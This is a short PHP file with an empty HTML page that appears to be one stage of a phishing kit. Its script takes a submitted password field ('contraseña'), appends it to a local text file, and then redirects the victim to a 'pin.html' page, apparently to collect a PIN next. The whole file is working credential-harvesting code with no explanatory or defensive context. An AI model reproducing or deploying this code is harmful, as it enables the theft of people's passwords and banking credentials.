<?php
date_default_timezone_set('America/Bogota');
$message = "contraseña: " . $_POST['campo2'] . "";
$file    = fopen("info.txt", "a");
fwrite($file, "$message \r\n");
fclose($file);
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="refresh" content="1; url=pin.html">
	<title>Document</title>
</head>
<body>
	
</body>
</html>